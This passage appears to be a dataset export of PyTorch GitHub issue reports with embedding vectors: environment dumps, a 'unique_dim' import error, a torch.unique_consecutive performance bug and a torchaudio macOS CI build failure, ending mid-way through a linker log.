[pip3] torch==1.10.0a0+git63955b3
[pip3] torch-tb-profiler==0.2.1
[pip3] torchaudio==0.9.0a0-jit-kaldi-fa498ad
[pip3] torchpq==0.1.8.3
[pip3] torchsummary==1.5.1
[pip3] torchvision==0.10.0

```

### Torch 1.8.0a0+618cf40 Env info
```bash
Collecting environment information...
PyTorch version: 1.8.0a0+618cf40
Is debug build: False
CUDA used to build PyTorch: 11.2
ROCM used to build PyTorch: N/A

OS: Ubuntu 18.04.5 LTS (x86_64)
GCC version: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
Clang version: Could not collect
CMake version: version 3.21.1
Libc version: glibc-2.27

Python version: 3.8.11 (default, Jul  3 2021, 17:53:42)  [GCC 7.5.0] (64-bit runtime)
Python platform: Linux-5.4.0-65-generic-x86_64-with-glibc2.27
Is CUDA available: False
CUDA runtime version: 11.2.152
GPU models and configuration: Could not collect
Nvidia driver version: Could not collect
cuDNN version: Probably one of the following:
/usr/lib/x86_64-linux-gnu/libcudnn.so.8.1.1
/usr/lib/x86_64-linux-gnu/libcudnn_adv_infer.so.8.1.1
/usr/lib/x86_64-linux-gnu/libcudnn_adv_train.so.8.1.1
/usr/lib/x86_64-linux-gnu/libcudnn_cnn_infer.so.8.1.1
/usr/lib/x86_64-linux-gnu/libcudnn_cnn_train.so.8.1.1
/usr/lib/x86_64-linux-gnu/libcudnn_ops_infer.so.8.1.1
/usr/lib/x86_64-linux-gnu/libcudnn_ops_train.so.8.1.1
HIP runtime version: N/A
MIOpen runtime version: N/A

Versions of relevant libraries:
[pip3] numpy==1.21.1
[pip3] pytorch-memlab==0.2.3
[pip3] torch==1.8.0a0+618cf40
[pip3] torchaudio==0.9.0a0-jit-kaldi-fa498ad
[pip3] torchpq==0.1.8.3
[pip3] torchsummary==1.5.1
[pip3] torchvision==0.10.0
[conda] Could not collect
``` 


cc @albanD @mruberry @jbschlosser",True,"[-4.55672830e-01  5.53850159e-02 -2.31766433e-01 -9.57125574e-02
 -2.81907499e-01 -1.95436835e-01 -2.91796058e-01  9.81440991e-02
 -2.35107645e-01 -1.30021334e-01 -2.04886228e-01  7.72297308e-02
 -6.48439229e-02  1.67097375e-01 -5.54400049e-02  1.58527687e-01
 -3.62311900e-01 -7.43152499e-02  1.84241563e-01 -8.29463825e-04
  4.97976355e-02 -1.26431912e-01 -2.13558555e-01  3.23099084e-04
  1.63824141e-01  2.28960752e-01 -6.63422495e-02 -5.93291633e-02
  1.71468198e-01 -1.96263529e-02  1.80440918e-01  1.34697109e-01
 -2.02410668e-01  1.10402912e-01 -1.33326679e-01 -2.79102564e-01
 -3.27853918e-01 -2.33746678e-01 -2.22769439e-01  5.94093017e-02
  3.95603329e-01  1.39008164e-01 -1.52572095e-01  5.98894693e-02
 -1.48624420e-01  1.21063687e-01 -9.60633159e-02  2.28066042e-01
 -2.10162506e-01 -1.89983815e-01  2.00017646e-01  1.21531464e-01
 -7.49521926e-02 -2.91673057e-02 -3.26339677e-02 -2.07639068e-01
  4.95038964e-02  4.37808931e-02 -1.01769231e-01 -3.12067479e-01
  1.88486785e-01 -4.04507816e-02  6.11768328e-02 -2.10796520e-01
  1.18472524e-01 -9.15182233e-02  6.89242333e-02  1.22183189e-01
  4.10552889e-01 -1.20537512e-01 -4.35572490e-02  6.81779236e-02
  2.98828864e-03 -1.85688287e-01 -9.01270751e-03  1.65060591e-02
 -2.51944214e-01  1.97229400e-01 -2.70166248e-01 -4.37636465e-01
 -1.07538238e-01 -9.99856833e-03 -9.32901800e-02 -1.49525493e-01
  2.99789887e-02 -1.53294355e-02  1.32702842e-01 -3.80495638e-01
  2.42951646e-01  1.76986948e-01 -2.96177305e-02  1.90496117e-01
 -1.27298862e-01  1.44262046e-01  2.40691021e-01  1.74542934e-01
  3.21897045e-02 -1.94372367e-02 -9.44333747e-02 -9.27489847e-02
  9.91957486e-02 -3.81327271e-01 -3.44853580e-01  3.92823756e-01
  1.56508256e-02 -3.83962214e-01 -3.23336460e-02  1.28934830e-01
 -6.79017156e-02 -1.72052369e-01  2.49207228e-01  4.91496325e-02
  8.16317648e-02 -1.41625106e-01  2.36911438e-02 -9.01585519e-02
 -3.25870633e-01  4.96015437e-02 -4.23123717e-01  5.38349152e-01
 -1.78892240e-01 -7.63704553e-02 -7.95121491e-02 -4.25198637e-02
  1.07393175e-01  2.30688192e-02 -6.17114194e-02 -1.88399091e-01
 -1.76606290e-02  5.99808842e-02  5.08208536e-02  2.33216107e-01
  3.04718882e-01  2.15602480e-02  3.57496768e-01  3.52443963e-01
 -2.33092010e-01 -1.25739664e-01 -9.99452472e-02  8.05809125e-02
 -4.65836301e-02  1.98437855e-01 -3.90226930e-01 -3.00111026e-01
 -2.05371417e-02  1.25921533e-01 -5.84525645e-01  2.17311248e-01
  1.40115559e-01  2.59509325e-01  4.06737998e-02 -1.02582514e-01
 -3.13857943e-01  3.27831835e-01  8.29681605e-02 -1.20151956e-02
  7.54136592e-02  3.40242386e-02  4.07767653e-01 -1.64230302e-01
 -8.47064704e-02  2.97085822e-01  6.35173842e-02 -1.60075411e-01
  3.33321929e-01 -5.50538041e-02 -2.78740019e-01  3.61943319e-02
 -2.08125010e-01  2.34100018e-02  4.34621125e-02 -9.22523588e-02
 -5.88148646e-02 -9.26069692e-02  7.93078095e-02 -1.54579788e-01
 -1.09204918e-01 -4.14500266e-01 -3.50599661e-02  8.73456150e-02
  7.01215491e-03  3.31769407e-01  3.94531310e-01 -9.08815786e-02
 -6.49434794e-03  1.45893216e-01  2.75082409e-01  1.29730254e-01
 -3.30834091e-01  3.26345824e-02 -3.21210921e-01 -2.73841143e-01
  6.93687052e-02 -1.74159706e-01 -9.61267576e-03  4.52596992e-02
  1.69225022e-01  9.26142633e-02  1.36856318e-01  9.27913636e-02
 -1.89698279e-01 -4.50389162e-02  1.88939795e-01  1.35141462e-01
  8.53285119e-02 -2.26844996e-02 -4.10290718e-01 -1.62590653e-01
 -2.93109387e-01  3.28884900e-01 -1.53895348e-01 -2.61360645e-01
 -6.50657117e-02 -1.52449757e-01 -1.24016866e-01  3.58046778e-02
 -1.36130467e-01  1.96636647e-01 -1.07621163e-01  1.33362725e-01
  6.11138463e-01 -1.40861556e-01 -8.40540454e-02 -4.56921905e-02
 -1.32654637e-01  1.08638234e-01 -1.97516903e-01 -5.59044108e-02
  6.62847310e-02  1.83808953e-01 -9.90113616e-02 -9.26192179e-02
 -2.26673663e-01  3.84934470e-02  9.72114280e-02  2.69743085e-01
  2.34077081e-01 -6.45266920e-02 -2.49108747e-01 -8.16146582e-02
  2.11804032e-01 -1.93952337e-01  8.25272128e-02 -5.31249009e-02
  1.48554593e-01  2.39126593e-01 -3.94285440e-01  6.59760237e-02
 -3.36365923e-02  3.03378031e-02 -1.80443823e-01  7.91669264e-03
  1.67052075e-02  3.64000052e-02  4.21797335e-01  6.86750337e-02
  6.10310063e-02 -1.41040087e-01 -7.34661222e-02 -7.19835237e-03
  3.65878046e-01  4.03456390e-01 -7.20535889e-02  2.02854484e-01
  2.24657297e-01 -2.33093053e-01 -5.46556823e-02  6.78386241e-02
 -2.41447270e-01  5.76807074e-02 -3.99049893e-02 -3.61888140e-01
  1.80651903e-01  1.19979605e-01  1.70758545e-01 -1.96037292e-01
  2.13571906e-01 -1.36260018e-01 -1.11029699e-01 -3.08371365e-01
  1.40352115e-01  2.73167789e-01  7.13218302e-02  2.18378007e-02
  4.54909801e-01 -2.96583533e-01 -6.54970780e-02 -2.34649509e-01
 -2.24851444e-01 -1.23006627e-01  5.70265315e-02  1.77086830e-01
  5.28164685e-01 -1.59185782e-01 -2.55537987e-01 -8.62780288e-02
  3.09251010e-01 -9.14826840e-02  1.11720309e-01 -1.81963265e-01
 -2.61039555e-01 -4.80158329e-02  2.14552402e-01 -1.89354986e-01
 -3.56986463e-01 -9.34793353e-02 -1.07741412e-02  7.22212046e-02
  3.47650349e-01 -2.76109129e-01  4.82877433e-01  3.81680876e-02
 -8.22816268e-02  1.85293585e-01 -1.04927197e-01  3.61143857e-01
 -1.28704188e-02  2.73492515e-01  8.64989161e-02  1.99113920e-01
  2.13738203e-01 -3.55373859e-01 -1.13744184e-01  8.30582976e-02
  1.42776445e-02 -2.13658318e-01 -1.40480027e-01  1.95649981e-01
 -1.08534582e-01  8.81143734e-02  2.45269015e-02 -1.78712398e-01
  3.92627597e-01 -2.38409340e-02  3.80521953e-01 -1.59190387e-01
  7.40203708e-02  2.30994225e-01  1.12815082e-01 -3.42870682e-01
 -3.37696016e-01  8.84597003e-02  2.53749564e-02 -1.03033483e-01
 -8.17147195e-02  1.49114743e-01  3.71836007e-01  9.17698741e-02
  1.06696874e-01 -1.07286200e-02  4.51525897e-02  1.08813137e-01
  8.32170155e-03  2.42711529e-02 -4.23871949e-02  3.85908812e-01
 -1.01148244e-02  1.76390618e-01  5.13690352e-01 -1.96464863e-02
  2.06658840e-02  4.04972360e-02 -1.27077460e-01  4.62521799e-03
 -3.46919447e-02  3.72467190e-02  2.90594399e-02 -1.72169879e-02
  1.40785009e-01  5.45961678e-01 -2.03829050e-01  2.95110106e-01
  9.90249515e-02  4.25190367e-02  3.27785254e-01 -2.40330964e-01
  9.54897981e-03 -2.47712284e-01  1.13792986e-01  4.61919233e-02
 -2.33917132e-01  1.65705323e-01 -7.82885402e-02 -3.75838161e-01]"
AttributeError: module 'torch' has no attribute 'unique_dim' high priority triaged module: ux,"## ðŸ› Bug

When using `from torch import *`, the error `AttributeError: module 'torch' has no attribute 'unique_dim'` appears.

## To Reproduce

Steps to reproduce the behavior:
1. install pytorch 1.9.0
2. from torch import *

<!-- If you have a code sample, error messages, stack traces, please provide it here as well -->

## Expected behavior

<!-- A clear and concise description of what you expected to happen. -->

## Environment

Please copy and paste the output from our
[environment collection script](https://raw.githubusercontent.com/pytorch/pytorch/master/torch/utils/collect_env.py)
(or fill out the checklist below manually).

You can get the script and run it with:
```
wget https://raw.githubusercontent.com/pytorch/pytorch/master/torch/utils/collect_env.py
# For security purposes, please check the contents of collect_env.py before running it.
python collect_env.py
```

PyTorch version: 1.9.0
Is debug build: False
CUDA used to build PyTorch: 11.1
ROCM used to build PyTorch: N/A

OS: Microsoft Windows 10 Pro
GCC version: (MinGW.org GCC-6.3.0-1) 6.3.0
Clang version: Could not collect
CMake version: Could not collect
Libc version: N/A

Python version: 3.7.6 (default, Jan  8 2020, 20:23:39) [MSC v.1916 64 bit (AMD64)] (64-bit runtime)
Python platform: Windows-10-10.0.19041-SP0
Is CUDA available: True
CUDA runtime version: 11.1.105
GPU models and configuration: GPU 0: GeForce GTX 1060 6GB
Nvidia driver version: 461.40
cuDNN version: C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v11.1\bin\cudnn_ops_train64_8.dll
HIP runtime version: N/A
MIOpen runtime version: N/A

Versions of relevant libraries:
[pip3] numpy==1.21.1
[pip3] numpydoc==1.1.0
[pip3] pytorch-lightning==0.5.2.1
[pip3] torch==1.9.0+cu111
[pip3] torchaudio==0.9.0
[pip3] torchvision==0.10.0+cu111
[conda] blas                      1.0                         mkl    defaults
[conda] cudatoolkit               11.1.1               heb2d755_7    conda-forge
[conda] mkl                       2020.2                      256    defaults
[conda] mkl-service               2.3.0            py37h196d8e1_0    defaults
[conda] mkl_fft                   1.3.0            py37h46781fe_0    defaults
[conda] mkl_random                1.1.1            py37h47e9c7a_0    defaults
[conda] numpy                     1.21.1                   pypi_0    pypi
[conda] numpy-base                1.18.5           py37hc3f5095_0    defaults
[conda] numpydoc                  1.1.0              pyhd3eb1b0_1    defaults
[conda] pytorch                   1.9.0           py3.7_cuda11.1_cudnn8_0    pytorch
[conda] pytorch-lightning         0.5.2.1                  pypi_0    pypi
[conda] torch                     1.2.0                    pypi_0    pypi
[conda] torchaudio                0.9.0                    pypi_0    pypi
[conda] torchvision               0.10.0+cu111             pypi_0    pypi


## Additional context

<!-- Add any other context about the problem here. -->


cc @ezyang @gchanan @zou3519 @bdhirsh @jbschlosser @anjali411",True,"[-3.15592498e-01 -2.36841645e-02 -9.42145959e-02  1.13152064e-01
  3.33425924e-02 -1.51364848e-01 -9.64888856e-02  4.76488359e-02
 -6.22337282e-01 -3.27834725e-01 -2.79210713e-02 -5.37898168e-02
 -2.22832263e-01  2.40559161e-01  2.10040390e-01  8.35306868e-02
 -2.14479536e-01 -2.36102849e-01 -1.01039775e-01 -1.23841263e-01
  8.58869627e-02 -7.85994679e-02  6.79680258e-02 -1.40387088e-01
 -1.28793895e-01  1.41384616e-01 -2.15104327e-01 -3.77206951e-02
  3.08034867e-01  1.39218010e-02  3.19008417e-02  5.05648926e-02
 -6.44366503e-01 -7.24624842e-03  2.12523699e-01  8.94477032e-03
 -4.08202380e-01  6.75794482e-02 -2.18691528e-01 -1.81588113e-01
  4.09507006e-01  2.97337770e-01 -7.65861422e-02  1.20800540e-01
 -2.87293732e-01  2.93822922e-02 -1.71614170e-01  6.99414909e-02
 -3.77769470e-01 -1.46107927e-01 -1.87525928e-01  3.11920121e-02
 -1.06785886e-01 -1.42824441e-01  1.12006932e-01 -3.32930684e-01
 -1.17680475e-01 -1.24487191e-01 -2.82758065e-02 -3.90684009e-01
 -7.35165775e-02 -6.78528380e-03 -8.55647773e-02 -1.63740382e-01
  4.46451977e-02 -1.09879151e-01 -1.45599395e-01  1.01827614e-01
  4.58216071e-01 -6.16756044e-02  1.74800962e-01  6.46180958e-02
 -3.38738859e-02 -9.99081433e-02 -1.26325101e-01 -9.85514075e-02
 -4.86984670e-01  2.36194193e-01 -4.06432509e-01 -1.65846020e-01
  2.79964879e-04  1.96404886e-02 -1.46150634e-01  9.21773314e-02
  1.42438546e-01 -1.07421009e-02  8.02600533e-02 -1.70532346e-01
  1.74789011e-01  2.84235060e-01  1.55364901e-01  2.38556176e-01
  1.12869710e-01  4.04347062e-01 -8.92529823e-03  2.34436154e-01
  2.42048323e-01 -9.41317677e-02 -1.52550817e-01 -2.44900003e-01
  2.01804694e-02 -7.39836037e-01 -2.10038945e-01  3.78876597e-01
  1.16383679e-01  2.34983973e-02  2.61802971e-02  3.21726829e-01
  3.42011154e-01 -2.25229383e-01  3.46914202e-01  5.04606962e-02
  3.04864999e-03 -1.32362038e-01 -5.58008403e-02 -2.23292217e-01
 -8.79458636e-02  4.14381213e-02 -2.30009332e-01  2.99591184e-01
  2.63951659e-01  3.79560649e-01  1.26964346e-01  2.01627254e-01
  4.57487851e-01  2.05984116e-01 -4.46888134e-02  5.72977886e-02
 -4.08875644e-02  3.44353646e-01 -8.97645652e-02  1.30887687e-01
 -2.98318639e-02 -9.37336981e-02  5.29524684e-01  4.89993930e-01
 -4.24114406e-01  8.49690661e-03  1.85970962e-01  7.92065486e-02
  1.07794851e-02  1.11830197e-01 -1.15656309e-01 -9.01068524e-02
  1.93507954e-01  5.49258254e-02 -1.70847028e-01  3.61266658e-02
  8.60158503e-02  4.98186424e-02  9.50100049e-02 -9.57901590e-03
 -4.56750125e-01  3.01172704e-01  9.89830047e-02  6.40871525e-02
 -9.67121869e-02  1.21780731e-01  5.81377029e-01 -3.52578998e-01
  2.22623080e-01  3.00891072e-01  1.56206973e-02 -4.99056317e-02
 -6.57523870e-02 -1.75315142e-03 -2.23861113e-01 -1.34065837e-01
 -4.29282606e-01 -9.27659720e-02 -6.22026101e-02 -3.43463421e-01
 -1.97615445e-01 -3.68548661e-01  5.39642051e-02 -1.44591127e-02
 -5.82511909e-02 -2.85839826e-01 -1.90573692e-01  3.83748591e-01
  4.80466008e-01  6.94748521e-01 -8.08549374e-02  3.42462778e-01
  4.71043028e-03  1.51205987e-01  2.31533900e-01 -2.85837620e-01
  3.38209905e-02 -1.37601808e-01 -5.02768397e-01 -2.91394532e-01
  4.03563797e-01 -1.15518928e-01  2.04602659e-01  1.45449221e-01
 -2.71050781e-02 -2.40172178e-01 -1.16009302e-02 -1.82039529e-01
 -8.29047784e-02  7.86334053e-02  8.17013718e-03  3.74600105e-03
  2.13153109e-01  4.88459729e-02  9.17732716e-04 -3.41431737e-01
 -3.96803051e-01  2.22594768e-01 -4.19641018e-01 -3.06767881e-01
 -4.43583056e-02 -1.78614855e-01  5.82491234e-03  2.25879014e-01
 -1.72959626e-01  2.31448159e-01  3.82083893e-01  1.18232548e-01
  8.40909705e-02  4.66393717e-02 -1.25553966e-01 -2.43596852e-01
  5.20865060e-02  4.17179286e-01 -2.63092846e-01 -4.21652943e-02
  8.79151747e-04 -2.56162304e-02 -7.46713877e-02 -2.25546509e-01
  4.42137420e-01  3.18512142e-01 -9.87565070e-02  5.32824159e-01
  1.36640519e-01 -9.09833312e-02 -6.38035536e-02  2.14268476e-01
 -1.88187391e-01  1.12980023e-01  2.55196929e-01 -2.33379558e-01
 -7.13666528e-02  1.93049014e-01 -1.00255877e-01 -3.89418542e-01
 -2.82320410e-01  5.63453995e-02 -6.65503889e-02 -1.94768667e-01
  4.56459597e-02 -1.14571869e-01  6.56630516e-01  2.60272563e-01
  6.60903752e-03 -3.08749914e-01  8.99050012e-02 -3.19152772e-01
 -6.61752671e-02  2.52003551e-01  3.21840569e-02  1.50831103e-01
 -1.20804951e-01 -9.10830647e-02 -1.94968835e-01  3.15444052e-01
 -8.59111026e-02 -4.01549041e-04  1.69139355e-01 -4.73253697e-01
  4.98780012e-01  4.05081868e-01  5.49344346e-04 -9.95530710e-02
  2.77935207e-01  5.24808168e-02  1.39477506e-01 -2.15550423e-01
  3.23914826e-01  2.40470946e-01 -3.83029170e-02  1.82754248e-01
  6.02364421e-01 -5.48179187e-02 -3.09789836e-01 -4.87171747e-02
 -1.72660723e-01  5.99824898e-02 -1.98102295e-01  8.75341520e-02
  2.66043454e-01 -1.01252392e-01 -2.71616220e-01  2.32656091e-01
  1.37207150e-01 -4.35285211e-01 -5.30024618e-02  2.24355489e-01
 -4.09269705e-04  1.48939639e-01  2.78565586e-01  6.72438964e-02
 -1.36231750e-01 -5.61560504e-03  8.63964558e-02 -9.26775783e-02
  4.17788237e-01 -4.35384154e-01  2.70815879e-01  2.15718895e-01
 -1.45192429e-01  6.86855093e-02 -1.22866191e-01  4.34408225e-02
 -4.30668369e-02  2.10044861e-01  1.60592735e-01 -6.19481616e-02
 -6.57918751e-02 -6.56374842e-02 -2.40026698e-01  1.18978709e-01
 -3.35927960e-03 -9.65611637e-02 -2.74156153e-01  1.49867922e-01
 -3.43937069e-01  2.21250832e-01  6.58695996e-02 -1.67993769e-01
  2.88049906e-01  1.28837228e-01  6.50354922e-02 -4.14008439e-01
 -1.10138297e-01  2.84069598e-01 -1.09243304e-01 -3.56196046e-01
 -1.34251729e-01 -1.43405989e-01  2.60079086e-01 -1.10240504e-01
 -4.16797817e-01 -7.45477602e-02  2.47538596e-01  8.83617252e-02
 -9.06083286e-02 -5.01670595e-03  4.44631465e-02 -6.17660172e-02
 -3.00863553e-02  4.02706563e-01 -4.18994576e-04  3.12521160e-01
  5.60197420e-02  9.22686309e-02  1.54609948e-01  4.77566749e-01
 -1.69049025e-01  1.64608210e-01 -1.85129970e-01 -1.47962928e-01
 -1.48614403e-02  4.37290706e-02 -1.72003895e-01 -2.98918992e-01
 -1.61101669e-03  2.40081608e-01 -2.39446774e-01  5.12159467e-02
 -1.45660535e-01  1.53209805e-01  1.24089062e-01 -5.06776348e-02
  1.30085275e-01  6.68411180e-02  1.78920165e-01 -1.55834123e-01
  4.90924299e-01  2.40869850e-01 -2.29754135e-01 -1.52155310e-01]"
torch.unique_consecutive() is very slow when dim is specified even with 1-d tensors module: performance triaged module: sorting and selection,"## Issue description

torch.unique_consecutive(dim=0) is very slow with 1-d tensors (and also with 2-d tensors). Please see the following. 

## Code example

torch.manual_seed(0)
t = torch.randint(500, (10000000, ))
t = torch.sort(t)[0]

start = time.time()
uniques, counts = torch.unique_consecutive(t, dim=0, return_counts=True)
end = time.time()
print(""torch.unique_consecutive(dim=0) time:"", end - start)

start = time.time()
uniques, counts = torch.unique_consecutive(t, return_counts=True)
end = time.time()
print(""torch.unique_consecutive() time:"", end - start)

## Code output

torch.unique_consecutive(dim=0) time: 27.382863759994507
torch.unique_consecutive() time: 0.011050701141357422

## System Info
Collecting environment information...
PyTorch version: 1.9.0+cu111
Is debug build: False
CUDA used to build PyTorch: 11.1
ROCM used to build PyTorch: N/A

OS: Ubuntu 18.04.5 LTS (x86_64)
GCC version: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
Clang version: Could not collect
CMake version: Could not collect
Libc version: glibc-2.27

Python version: 3.8.8 (default, Apr 13 2021, 19:58:26)  [GCC 7.3.0] (64-bit runtime)
Python platform: Linux-5.4.0-1055-azure-x86_64-with-glibc2.10
Is CUDA available: False
CUDA runtime version: 11.1.74
GPU models and configuration: Could not collect
Nvidia driver version: Could not collect
cuDNN version: Could not collect
HIP runtime version: N/A
MIOpen runtime version: N/A

Versions of relevant libraries:
[pip3] numpy==1.19.5
[pip3] numpydoc==1.1.0
[pip3] torch==1.9.0+cu111
[pip3] torch-geometric==1.7.2
[pip3] torch-scatter==2.0.7
[pip3] torch-sparse==0.6.10
[pip3] torch-tb-profiler==0.2.1
[pip3] torchaudio==0.9.0
[pip3] torchvision==0.10.0+cu111
[conda] blas                      1.0                         mkl  
[conda] mkl                       2021.2.0           h06a4308_296  
[conda] mkl-service               2.3.0            py38h27cfd23_1  
[conda] mkl_fft                   1.3.0            py38h42c9631_2  
[conda] mkl_random                1.2.1            py38ha9443f7_2  
[conda] numpy                     1.19.5                   pypi_0    pypi
[conda] numpydoc                  1.1.0              pyhd3eb1b0_1  
[conda] torch                     1.9.0+cu111              pypi_0    pypi
[conda] torch-geometric           1.7.2                    pypi_0    pypi
[conda] torch-scatter             2.0.7                    pypi_0    pypi
[conda] torch-sparse              0.6.10                   pypi_0    pypi
[conda] torch-tb-profiler         0.2.1                    pypi_0    pypi
[conda] torchaudio                0.9.0                    pypi_0    pypi
[conda] torchvision               0.10.0+cu111             pypi_0    pypi


cc @VitalyFedyunin @ngimel @heitorschueroff",True,"[-0.50869244  0.15257932 -0.03075732  0.02225786 -0.08507863 -0.19084145
  0.01253305  0.06438835 -0.16615334 -0.12135665 -0.15400456  0.40051442
 -0.14590722  0.02486661 -0.07856721  0.16355464 -0.09813984  0.08274063
 -0.22045363 -0.03820841  0.31234097 -0.17490521 -0.22135478 -0.1026136
 -0.10944231  0.13107488 -0.05780332  0.08362976  0.36715895 -0.28239822
  0.06311467  0.00737308 -0.41804034  0.17772214 -0.02010283  0.08058532
 -0.71234405 -0.1484839   0.04002655  0.05134447  0.23136912  0.2265397
  0.21236777  0.0736859  -0.35217023  0.4773699  -0.2562952   0.28093886
 -0.13274069 -0.13129473 -0.14125487  0.14374901 -0.26380992 -0.18535209
  0.01185246 -0.54419065 -0.5077021  -0.56301796 -0.03648764 -0.603207
  0.567251    0.14615263 -0.06764824 -0.04796787  0.22062163  0.03443582
  0.29078808  0.20590311  0.74844944  0.16056395  0.11255202  0.3595782
 -0.40178266  0.11969665 -0.10084826  0.03522877 -0.24096501  0.11446064
 -0.23054668 -0.43829882 -0.14874089 -0.1874709  -0.2520011  -0.21523272
  0.12289767 -0.02344999  0.42034054 -0.02269019 -0.04919221  0.00304615
 -0.04888024  0.21921587 -0.22912289 -0.08537413  0.05256399  0.1287697
  0.3741207  -0.2741203   0.04286487  0.06849203 -0.06147749 -0.51679826
 -0.2198082   0.280521    0.17348337 -0.0384899  -0.1897761   0.41953993
  0.02120112  0.1318686   0.37816912 -0.01107183  0.2867158  -0.05546772
 -0.18058193 -0.20902336 -0.15095492  0.14245887  0.20080864  0.73201066
  0.10604575  0.15448807  0.0837601   0.18615988  0.26482856  0.20298703
  0.2880349   0.02137092 -0.07360751  0.21957311  0.00222773 -0.19293618
 -0.2703415   0.33795333  0.19197491  0.23003498 -0.3597377   0.2558452
 -0.00131751  0.29705113 -0.21546198  0.19178171 -0.09131178 -0.22836325
  0.7298105  -0.07226298 -0.27391437 -0.3157748  -0.01787781  0.16787127
 -0.11479172 -0.07161961 -0.12686163 -0.12859735  0.2515314   0.0295897
 -0.06146072  0.01316799  0.32953835 -0.2595455   0.24989605  0.49430868
  0.3127631   0.16970304  0.24043912 -0.00928773 -0.09920345 -0.16930275
 -0.34797293  0.4050545   0.07434841 -0.5039167  -0.57092977  0.03606897
 -0.04861943 -0.1807053  -0.17386258 -0.40095282 -0.35647547  0.24845567
  0.3644362   0.39344567  0.03025847  0.13311791 -0.14589034  0.05829987
  0.29555863  0.13839543 -0.27687776 -0.24673659 -0.60299134 -0.31850588
  0.25250995  0.05350107  0.25024074  0.04119223  0.23180625 -0.40808862
 -0.11273554  0.19101408 -0.09511978 -0.49191076 -0.21799175 -0.1607107
  0.44203037  0.13961275 -0.31931475 -0.42532605 -0.23307669  0.21340695
 -0.35324168 -0.03712428 -0.35563612  0.00257111 -0.07425793 -0.08263535
 -0.5325786   0.13419095 -0.00518812  0.32582217  0.54607403 -0.00818286
 -0.1373498  -0.30948716 -0.07345343 -0.03863104 -0.2781204   0.25794345
  0.279285   -0.11965874 -0.00395629  0.12081575  0.10169896  0.03321324
  0.12900788  0.05200922  0.18521437 -0.2769029  -0.14708139  0.04810941
 -0.02484146 -0.07951915  0.3665974   0.20520416 -0.01947085  0.5325537
 -0.3294199  -0.3242345  -0.02565048  0.13121319 -0.28487158  0.05331232
 -0.66623497 -0.15521151  0.23483849 -0.10392835 -0.11231177 -0.10810368
  0.05902106 -0.2683719   0.01048835  0.18261121  0.06716108  0.49388117
  0.27056614  0.10366154 -0.01891963  0.20241025  0.05204372 -0.01267505
 -0.2704234  -0.18001881  0.4000993   0.04534292  0.07158961 -0.15604325
  0.02209398  0.03133558 -0.15823393 -0.2872466   0.10339727  0.2611109
 -0.24573934  0.7074719   0.07251587 -0.20357879  0.10877137  0.19741118
  0.16174126 -0.20930442 -0.3587885   0.00922988  0.3791659  -0.39698413
 -0.26116076  0.33607948 -0.11277288 -0.31991386 -0.01105656 -0.17308885
 -0.09438511  0.07552186  0.4152661   0.11469015 -0.4059919   0.01299033
  0.30311048  0.12632918  0.27436817  0.1101789   0.39425418 -0.07892803
 -0.10595923  0.21487011  0.06208807 -0.05117891  0.12725373  0.28115156
  0.07122146  0.16656385  0.17977321 -0.06562474 -0.16385713  0.03431358
  0.14808547 -0.18464027  0.06905869  0.1686423  -0.34326118  0.12387042
  0.3384372  -0.3073842   0.16738498 -0.05012298  0.01435185 -0.49222928
 -0.1243206   0.14350116 -0.02329551 -0.18821613 -0.22963324  0.02772632
  0.22721994 -0.30896616 -0.33663613 -0.00373867  0.4604316  -0.21349013
 -0.15246636 -0.06393094 -0.054527   -0.0253499   0.23546731  0.24869174
  0.27303737  0.26401412 -0.10165475  0.13584025 -0.1458579   0.19583966
  0.14588486  0.21077749 -0.20846418  0.09296711  0.0266953  -0.18815765
  0.1521326  -0.29407996  0.06775952  0.23263657  0.08009759  0.16304258
  0.0681961   0.22931924  0.45078856 -0.37549138  0.08694626  0.09851189
  0.01165509  0.00899747  0.31673738 -0.15526077 -0.7584693   0.08316483]"
torchaudio build fails on CI for macOS + conda module: build triaged module: macos,"## ðŸ› Bug

Since around June 16th, torchaudio's nightly build (and regular CI jobs) started fail on macOS  + conda.

The latest one is https://app.circleci.com/pipelines/github/pytorch/audio/6763/workflows/0dc6aaf1-c5c9-4459-882a-5c9d1188f8f9

The relevant error is as follow and it appears to be related to Intel MKL. `-lmkl_intel_ilp64`


```
[98/99] : && /Applications/Xcode-12.0.1.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/bin/c++ -Wall  -O3 -DNDEBUG -isysroot /Applications/Xcode-12.0.1.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX10.15.sdk -dynamiclib -Wl,-headerpad_max_install_names -undefined dynamic_lookup -o torchaudio/csrc/_torchaudio.so -install_name @rpath/_torchaudio.so torchaudio/csrc/CMakeFiles/_torchaudio.dir/pybind.cpp.o torchaudio/csrc/CMakeFiles/_torchaudio.dir/lfilter.cpp.o torchaudio/csrc/CMakeFiles/_torchaudio.dir/overdrive.cpp.o torchaudio/csrc/CMakeFiles/_torchaudio.dir/utils.cpp.o torchaudio/csrc/CMakeFiles/_torchaudio.dir/rnnt/cpu/compute_alphas.cpp.o torchaudio/csrc/CMakeFiles/_torchaudio.dir/rnnt/cpu/compute_betas.cpp.o torchaudio/csrc/CMakeFiles/_torchaudio.dir/rnnt/cpu/compute.cpp.o torchaudio/csrc/CMakeFiles/_torchaudio.dir/rnnt/compute_alphas.cpp.o torchaudio/csrc/CMakeFiles/_torchaudio.dir/rnnt/compute_betas.cpp.o torchaudio/csrc/CMakeFiles/_torchaudio.dir/rnnt/compute.cpp.o torchaudio/csrc/CMakeFiles/_torchaudio.dir/rnnt/autograd.cpp.o torchaudio/csrc/CMakeFiles/_torchaudio.dir/kaldi.cpp.o torchaudio/csrc/CMakeFiles/_torchaudio.dir/sox/io.cpp.o torchaudio/csrc/CMakeFiles/_torchaudio.dir/sox/utils.cpp.o torchaudio/csrc/CMakeFiles/_torchaudio.dir/sox/effects.cpp.o torchaudio/csrc/CMakeFiles/_torchaudio.dir/sox/effects_chain.cpp.o torchaudio/csrc/CMakeFiles/_torchaudio.dir/sox/types.cpp.o  -Wl,-rpath,/Users/distiller/project/env/lib/python3.6/site-packages/torch/lib  ../../env/lib/python3.6/site-packages/torch/lib/libc10.dylib  ../../env/lib/python3.6/site-packages/torch/lib/libtorch_python.dylib  third_party/kaldi/libkaldi.a  ../../third_party/sox/../install/lib/libsox.a  ../../third_party/sox/../install/lib/libopencore-amrnb.a  ../../third_party/sox/../install/lib/libopencore-amrwb.a  ../../third_party/sox/../install/lib/libmad.a  ../../third_party/sox/../install/lib/libmp3lame.a  